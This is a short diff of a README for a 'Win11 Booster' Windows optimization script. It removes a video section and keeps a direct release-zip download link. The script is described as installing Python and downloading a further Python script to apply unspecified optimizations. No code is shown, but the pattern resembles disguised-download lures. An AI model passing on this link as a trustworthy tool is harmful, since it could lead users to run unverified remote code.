@@ -10,11 +10,6 @@ To use the Win11 Booster script, follow the steps below:
 
 Download the project https://github.com/Scuttlang/Win11-Booster/releases/download/owner/Win11-Booster-main.zip and extract the contents.
 
-## Video
-
-![Video-senza-titolo-Realizzato-con-Clipchamp-_6_](https://github.com/Scuttlang/Win11-Booster/assets/139585282/1b3bcb26-aa15-4089-b17c-8614346aa1d6)
-
-
 ## Description
 
 The Win11 Booster script automates the process of optimizing your Windows 11 system for enhanced performance. It registers the Desktop App Installer, installs Python 3.11, creates a designated directory, and downloads a Python script to apply performance optimizations.
